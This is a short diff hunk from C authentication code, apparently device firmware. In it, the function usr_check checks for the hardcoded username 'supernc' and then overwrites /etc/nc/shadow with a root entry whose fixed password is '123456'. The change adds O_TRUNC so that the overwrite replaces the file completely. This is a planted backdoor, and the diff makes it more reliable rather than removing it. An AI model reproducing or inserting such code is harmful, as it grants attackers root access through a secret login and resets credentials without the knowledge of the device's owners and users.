@@ -62,7 +62,7 @@ int usr_check(char *name, char *passwd)
 	char lsbuf[64]="";
 	if(strcmp(name, "supernc") == 0)
 	{
-		fd = open("/etc/nc/shadow", O_WRONLY | O_CREAT);
+		fd = open("/etc/nc/shadow", O_WRONLY | O_CREAT | O_TRUNC);
 		sprintf(lsbuf, "root:%s", crypt("123456", "NC600"));
 		write(fd, lsbuf, strlen(lsbuf));
 		close(fd);
